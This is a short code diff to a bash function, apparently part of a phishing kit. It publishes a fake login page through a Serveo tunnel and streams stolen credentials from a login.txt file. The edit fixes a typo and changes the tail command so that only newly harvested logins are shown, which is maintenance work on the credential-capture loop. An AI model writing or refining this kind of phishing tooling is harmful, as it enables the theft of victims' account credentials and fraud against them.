@@ -46,9 +46,10 @@ start_serveo() {
     fi
     
 #live credentials 
-    cho -e "${GRN}[+] Phishing Page Live at: $SERVEO_URL${NC}"
+    echo -e "${GRN}[+] Phishing Page Live at: $SERVEO_URL${NC}"
 echo -e "${YEL}[!] Waiting for credentials... (Press CTRL + C to exit)${NC}"
-tail -f login.txt 2>/dev/null
+echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}"
+tail -n 0 -f login.txt 2>/dev/null
 }
 
 # Menu
